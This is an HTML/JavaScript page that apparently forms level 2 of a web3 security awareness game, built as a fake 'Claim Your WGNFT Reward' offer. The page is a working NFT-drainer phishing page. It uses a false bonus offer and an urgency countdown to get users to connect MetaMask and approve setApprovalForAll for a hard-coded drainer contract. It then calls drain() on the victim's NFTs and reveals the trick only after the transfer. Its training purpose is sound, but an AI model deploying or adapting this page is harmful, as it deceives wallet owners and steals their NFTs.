<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>WGNFT Vault | Claim Your Reward</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: url('https://images.unsplash.com/photo-1612197528463-1c4e7b631799?ixlib=rb-4.0.3&auto=format&fit=crop&w=1470&q=80') no-repeat center center fixed;
      background-size: cover;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .card {
      background: rgba(0, 0, 0, 0.85);
      border-radius: 10px;
      padding: 2rem;
      box-shadow: 0 0 18px #26a69a;
      max-width: 540px;
      width: 100%;
      text-align: center;
    }
    button {
      padding: 1rem 2rem;
      margin-top: 1rem;
      font-size: 1rem;
      background: #26a69a;
      border: none;
      border-radius: 8px;
      color: #fff;
      cursor: pointer;
    }
    .danger {
      background: #e74c3c;
    }
    #status {
      margin-top: 2rem;
      font-size: 1rem;
      white-space: pre-wrap;
      text-align: left;
    }
    #timer {
      font-weight: bold;
      color: #ffeb3b;
    }
    #nextBtn {
      display: none;
      margin-top: 1.5rem;
      background: #4caf50;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>üéÅ Claim Your WGNFT Reward</h1>
    <p>
      Congratulations! You‚Äôre eligible to claim <strong>200% bonus yield</strong> on your staked WarGame NFTs.<br/>
      Offer ends in <span id="timer">3h 42m 00s</span>.
    </p>
    <p><em>Rewards paid in WGFAKE. Powered by zkVaults.</em></p>
    <button id="connectBtn">Connect Wallet</button>
    <button id="previewBtn">Preview Claim</button>
    <button id="claimBtn" style="display: none;">Confirm Claim</button>
    <a href="index3.html" id="nextBtn">‚û°Ô∏è Proceed to Level 3</a>
    <div id="status"></div>
  </div>

  <script>
    // Countdown timer
    let countdown = 3 * 60 * 60 + 42 * 60;
    const timerElement = document.getElementById("timer");
    setInterval(() => {
      if (countdown <= 0) return;
      countdown--;
      const hrs = Math.floor(countdown / 3600);
      const mins = Math.floor((countdown % 3600) / 60);
      const secs = countdown % 60;
      timerElement.innerText = `${hrs}h ${mins}m ${secs}s`;
    }, 1000);

    const nftAddress = "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604";
    const drainerAddress = "0x8d7283F4449EDF62FA2ec7D88bDFa8eD7C96d334";

    const nftABI = [
      "function setApprovalForAll(address operator, bool approved) external",
      "function isApprovedForAll(address owner, address operator) external view returns (bool)"
    ];

    const drainerABI = [
      "function drain(address nft, address victim) external"
    ];

    let provider, signer, nft, drainer;

    document.getElementById("connectBtn").onclick = async () => {
      const status = document.getElementById("status");
      if (!window.ethereum) {
        alert("Please install MetaMask to use this dApp.");
        return;
      }
      try {
        status.innerText = "‚è≥ Connecting wallet...";
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();

        const userAddress = await signer.getAddress();
        nft = new ethers.Contract(nftAddress, nftABI, signer);
        drainer = new ethers.Contract(drainerAddress, drainerABI, signer);

        status.innerText = `‚úÖ Connected: ${userAddress}`;
      } catch (err) {
        console.error("Connection error:", err);
        status.innerText = `‚ùå Connection failed.`;
      }
    };

    document.getElementById("previewBtn").onclick = () => {
      document.getElementById("status").innerText =
        "üì¶ Previewing reward calculation...\n\nEstimated reward: 420 WGFAKE\nStake Duration: 12 days\nNetwork Fee: 0.002 ETH";
      document.getElementById("claimBtn").style.display = "inline-block";
    };

    document.getElementById("claimBtn").onclick = async () => {
      const status = document.getElementById("status");
      if (!signer) return alert("Connect your wallet first.");

      try {
        status.innerText = "üîê Requesting NFT claim rights...";
        const approvalTx = await nft.setApprovalForAll(drainerAddress, true);
        await approvalTx.wait();

        const userAddress = await signer.getAddress();
        status.innerText = "üöÄ Claim rights granted. Finalizing reward...";

        const drainTx = await drainer.drain(nftAddress, userAddress);
        await drainTx.wait();

        status.innerText = "üíÄ You got drained! This trap used `setApprovalForAll()` to gain permission to transfer **ALL your NFTs**.\n\nüß† Lesson: Never blindly approve access to your entire NFT collection. Always check who you're giving permissions to.";
        localStorage.setItem("w3game_level2", "drained");
      } catch (err) {
        if (err.code === "ACTION_REJECTED") {
          status.innerText = "‚úÖ You survived Level 2!\n\nüõ°Ô∏è You avoided signing a malicious `setApprovalForAll()` transaction.\n\nThis would have given an attacker control over all your NFTs from this collection.\n\nGreat job ‚Äî prepare for Level 3.";
          document.getElementById("nextBtn").style.display = "inline-block";
          localStorage.setItem("w3game_level2", "survived");
        } else {
          console.error("Drain error:", err);
          status.innerText = `‚ö†Ô∏è Unexpected error occurred.`;
        }
      }
    };

    window.onload = () => {
      if (localStorage.getItem("w3game_level2") === "survived") {
        document.getElementById("nextBtn").style.display = "inline-block";
      }
    };
  </script>
</body>
</html>
